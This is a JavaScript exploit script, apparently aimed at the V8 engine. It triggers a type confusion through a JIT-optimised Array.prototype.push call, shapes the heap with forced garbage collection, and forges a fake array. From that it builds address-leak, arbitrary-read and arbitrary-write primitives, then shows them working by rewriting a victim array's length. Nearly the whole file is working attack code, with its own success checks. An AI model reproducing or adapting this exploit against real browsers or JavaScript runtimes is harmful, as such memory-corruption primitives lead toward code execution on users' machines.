var addrOf_LO = new Array(0x30000);

function assert(val) {
    if (!val)
        throw "Assertion Failed";
}

class Helpers {
  constructor() {
      this.buf = new ArrayBuffer(8);
      this.dv = new DataView(this.buf);
      this.u8 = new Uint8Array(this.buf);
      this.u32 = new Uint32Array(this.buf);
      this.u64 = new BigUint64Array(this.buf);
      this.f32 = new Float32Array(this.buf);
      this.f64 = new Float64Array(this.buf);
      // lazy init
      // this.roots = new Array(0x30000);
      this.index = 0;
  }

  pair_i32_to_f64(p1, p2) {
      this.u32[0] = p1;
      this.u32[1] = p2;
      return this.f64[0];
  }

  i64tof64(i) {
      this.u64[0] = i;
      return this.f64[0];
  }

  f64toi64(f) {
      this.f64[0] = f;
      return this.u64[0];
  }

  set_i64(i) {
      this.u64[0] = i;
  }

  set_l(i) {
      this.u32[0] = i;
  }

  set_h(i) {
      this.u32[1] = i;
  }

  get_i64() {
      return this.u64[0];
  }

  ftoil(f) {
      this.f64[0] = f;
      return this.u32[0]
  }

  ftoih(f) {
      this.f64[0] = f;
      return this.u32[1]
  }

  add_ref(object) {
      if (!this.roots)  
        this.roots = new Array(0x30000);
      this.roots[this.index++] = object;
  }

  mark_sweep_gc() {
      new ArrayBuffer(0x7fe00000);
  }

  scavenge_gc() {
      for (var i = 0; i < 8; i++) {
          this.add_ref(new ArrayBuffer(0x200000));
      }
      this.add_ref(new ArrayBuffer(8));
  }
  trap() {
      while (1) {
      }
  }
}
var helper = new Helpers();
var fake_arr_buf = null;
var fake_arr = null;

function exp() {
    function nop(arg) {}
    function f0(v2, v3) {
        var v4 = v3[0]; 
        var v5 = v2[0]; 
        // fake_arr_buf elements: 0x16f200040011
        // 0x00002a6000040011+8 = 0x00002a6000040019
        Array.prototype.push.call(v3, 2.301941046992e-310);

        for(let i = 0; i < 0x800; i++)
            nop();
   }
    var v0 = new Array(1);
    v0[0] = 'tagged';
    for (let i = 0; i < 0x10; i++)
        f0(v0, [1]);

    var v1 = new Array(1);
    v1[0] = 0.1;
    for (let i = 0; i < 0x1000; i++)
      f0(v0, [1]);

    helper.scavenge_gc();
    helper.scavenge_gc();

    // 0x00189c39   0x00000745  0x00000745  0x000001d2 / SMI(233)
    // map          properties  elements    length
    // see commented `%DebugPrint(empty_arr_in_young_gc);`
    fake_arr_buf = [
      3.9490349638436e-311, 9.888500395093e-312,
      1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1
    ];

    // trigger
    f0(v1, v1);
    v1[5] = 0.1;
   
   fake_arr = v1[2];
}
exp();
exp();

// check if fake is success
if (fake_arr.length != 233) {
    console.log("[-] fake array failed");
    throw "fake array failed";
}
console.log("[+] fake array success");

function addrOf(object) {
  fake_arr_buf[1] = helper.i64tof64(0x0006000000202129n);
  addrOf_LO[0] = object;
  return helper.ftoil(fake_arr[0]);
}

function arbRead(where) {
  fake_arr_buf[1] = helper.pair_i32_to_f64(where - 8, 0x60000);
  return helper.f64toi64(fake_arr[0]);
}

function arbWrite(where, what) {
  fake_arr_buf[1] = helper.pair_i32_to_f64(where - 8, 0x60000);
  fake_arr[0] = helper.i64tof64(what);
}

var victim_array = [1.1, 1.2];
console.log("[*] Now we try to modify the length of the victim array...");
console.log("- Before: " + victim_array.length);
// %DebugPrint(victim_array);
arbWrite(0x40149 + 1 + 0xc, 0x2333n);
console.log("- After: " + victim_array.length);

